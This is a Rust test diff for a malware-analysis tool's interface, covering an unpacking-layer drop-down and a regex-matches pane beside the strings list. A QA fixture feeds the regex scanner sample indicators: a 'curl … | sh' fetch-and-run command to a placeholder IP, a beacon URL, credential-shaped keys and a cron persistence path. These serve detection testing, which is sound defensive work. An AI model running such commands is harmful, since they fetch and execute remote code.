@@ -999,7 +999,16 @@ fn native_analysis_workspace_fixture() {
             // its position in the strip.
             let directory =
                 std::env::var_os("ANTINOMIE_ANALYSIS_QA_DIR").map(std::path::PathBuf::from);
-            let (qa_report, qa_page) = qa_report();
+            let regex_view = view_name == "regex";
+            let (qa_report, qa_page) = if regex_view {
+                let report = with_listing(fixture(), AnalysisKind::Strings, 12);
+                let page = listing_page(&report, AnalysisKind::Strings).ok();
+                (report, page)
+            } else if view_name == "unpack" {
+                (unpacked_report(), None)
+            } else {
+                qa_report()
+            };
             let report = directory.as_ref().map_or_else(
                 || qa_report,
                 |directory| {
@@ -1036,6 +1045,32 @@ fn native_analysis_workspace_fixture() {
                     "strings" => Tab::Strings,
                     _ => Tab::FileInfo,
                 };
+            }
+            if view_name == "unpack" {
+                state.tab = Tab::Unpacking;
+                state.unpack_layer = var("ANTINOMIE_QA_LAYER").parse().unwrap_or(0);
+            }
+            if regex_view {
+                state.tab = Tab::Strings;
+                crate::regex_matches::remember_data_dir(&std::env::temp_dir().join("ant-qa-regex"));
+                state.regex_asked = report.id.clone();
+                state.regex.open_for(
+                    &report.id,
+                    "fixture".into(),
+                    std::sync::Arc::new(|rules, _| {
+                        let mut scan = antinomie_monitor_core::strings_regex::Scan::default();
+                        for text in [
+                            "beacon to http://203.0.113.9/gate",
+                            "key AKIAIOSFODNN7EXAMPLE",
+                            "ghp_16C7e42F292c6912E7710c838347Ae178B4a",
+                            "curl -s http://198.51.100.7/x | sh",
+                            "/etc/cron.d/persist",
+                        ] {
+                            rules.scan_text(text, &Default::default(), &mut scan);
+                        }
+                        Ok(scan)
+                    }),
+                );
             }
             state.active_view = Some("Structures/Sections".into());
             state.views.insert(
@@ -2178,7 +2213,7 @@ fn unpacked_report() -> AnalysisReport {
 }
 
 #[test]
-fn the_unpacking_tab_shows_the_chain_as_phases_and_opens_a_layers_analysis() {
+fn the_unpacking_tab_picks_a_layer_from_a_drop_down_and_opens_its_analysis() {
     let ctx = egui::Context::default();
     crate::theme::install(&ctx);
     let report = unpacked_report();
@@ -2209,23 +2244,75 @@ fn the_unpacking_tab_shows_the_chain_as_phases_and_opens_a_layers_analysis() {
         .0;
     }
     let shown = texts(&output);
+    let has =
+        |shown: &[(String, egui::Rect)], label: &str| shown.iter().any(|(text, _)| text == label);
+    // The file as it came is chosen; no phase boxes and no link to itself.
     for label in [
-        "Phase 1",
+        "Layer",
+        "1 of 2",
         "As it came",
-        "Phase 2",
-        "Unpacked by UPX (header repaired)",
         "Packed with UPX (header modified)",
-        "No packer found",
-        "Show its analysis",
         "The magic in the loader header was overwritten.",
     ] {
-        assert!(
-            shown.iter().any(|(text, _)| text == label),
-            "{label} in {shown:?}"
-        );
+        assert!(has(&shown, label), "{label} in {shown:?}");
     }
+    assert!(!shown.iter().any(|(text, _)| text.starts_with("Phase ")));
+    assert!(!has(&shown, "Show its analysis"));
     // The tab names its category in the strip.
-    assert!(shown.iter().any(|(text, _)| text == "Unpacking"));
+    assert!(has(&shown, "Unpacking"));
+    // Open the drop-down and choose the unpacked layer.
+    let combo = shown
+        .iter()
+        .find(|(text, _)| text.starts_with("Layer 0 · As it came"))
+        .expect("the drop-down shows the chosen layer")
+        .1;
+    let opened = press(
+        &ctx,
+        &report,
+        &mut state,
+        None,
+        size,
+        (egui::PointerButton::Primary, combo.center()),
+        (None, None),
+    );
+    let entry = texts(&opened.output)
+        .into_iter()
+        .find(|(text, _)| text.starts_with("Layer 1 · Unpacked by UPX (header repaired)"))
+        .expect("the list names the unpacked layer")
+        .1;
+    press(
+        &ctx,
+        &report,
+        &mut state,
+        None,
+        size,
+        (egui::PointerButton::Primary, entry.center()),
+        (None, None),
+    );
+    assert_eq!(state.unpack_layer, 1);
+    let mut output = egui::FullOutput::default();
+    for _ in 0..3 {
+        output = frame(
+            &ctx,
+            &report,
+            &mut state,
+            None,
+            size,
+            Vec::new(),
+            (None, None),
+        )
+        .0;
+    }
+    let shown = texts(&output);
+    for label in [
+        "2 of 2",
+        "Unpacked by UPX (header repaired)",
+        "No packer found",
+        "Show its analysis",
+    ] {
+        assert!(has(&shown, label), "{label} in {shown:?}");
+    }
+    assert!(!has(&shown, "Packed with UPX (header modified)"));
     let button = shown
         .iter()
         .find(|(text, _)| text == "Show its analysis")
@@ -2262,4 +2349,87 @@ fn the_unpacking_tab_shows_the_chain_as_phases_and_opens_a_layers_analysis() {
     assert!(texts(&output)
         .iter()
         .any(|(text, _)| text.contains("was not part of this analysis")));
+}
+
+#[test]
+fn strings_and_regex_share_a_tab_with_the_matches_on_the_right() {
+    let ctx = egui::Context::default();
+    crate::theme::install(&ctx);
+    let report = with_listing(fixture(), AnalysisKind::Strings, 3);
+    let page = listing_page(&report, AnalysisKind::Strings);
+    let mut state = WorkspaceState::default();
+    state.bind(&report.id);
+    state.tab = Tab::Strings;
+    let pages = (None, Some(&page));
+    let at = |output: &egui::FullOutput, wanted: &str| {
+        texts(output)
+            .into_iter()
+            .find(|(text, _)| text == wanted)
+            .map(|(_, rect)| rect)
+    };
+    // The tab is named for both, and no separate button or window remains.
+    let (output, action) = frame(
+        &ctx,
+        &report,
+        &mut state,
+        None,
+        egui::vec2(1400.0, 800.0),
+        Vec::new(),
+        pages,
+    );
+    assert!(at(&output, "Strings & regex").is_some());
+    assert!(!texts(&output)
+        .iter()
+        .any(|(text, _)| text.contains("Regex matches…")));
+    // The first frame asks for the scan of this report, and only once.
+    assert!(action.is_none());
+    assert_eq!(state.take_regex_request().as_deref(), Some(&*report.id));
+    let (output, again) = frame(
+        &ctx,
+        &report,
+        &mut state,
+        None,
+        egui::vec2(1400.0, 800.0),
+        Vec::new(),
+        pages,
+    );
+    assert!(again.is_none() && state.take_regex_request().is_none());
+    // Wide: the pane is right of the strings.
+    let pane = at(&output, "Regex matches").expect("the pane's heading");
+    let strings = at(&output, "fixture string 0")
+        .unwrap_or_else(|| panic!("a string row in {:?}", texts(&output)));
+    assert!(pane.left() > strings.right(), "{pane:?} {strings:?}");
+    // Narrow: it sits under them.
+    let mut narrow = None;
+    for _ in 0..4 {
+        narrow = Some(
+            frame(
+                &ctx,
+                &report,
+                &mut state,
+                None,
+                egui::vec2(700.0, 800.0),
+                Vec::new(),
+                pages,
+            )
+            .0,
+        );
+    }
+    let narrow = narrow.unwrap();
+    let pane = at(&narrow, "Regex matches").expect("the pane's heading");
+    let strings = at(&narrow, "fixture string 0")
+        .unwrap_or_else(|| panic!("a string row in {:?}", texts(&narrow)));
+    assert!(pane.top() > strings.bottom(), "{pane:?} {strings:?}");
+    // Other tabs have no pane.
+    state.tab = Tab::Floss;
+    let (floss, _) = frame(
+        &ctx,
+        &report,
+        &mut state,
+        None,
+        egui::vec2(1400.0, 800.0),
+        Vec::new(),
+        pages,
+    );
+    assert!(at(&floss, "Regex matches").is_none());
 }
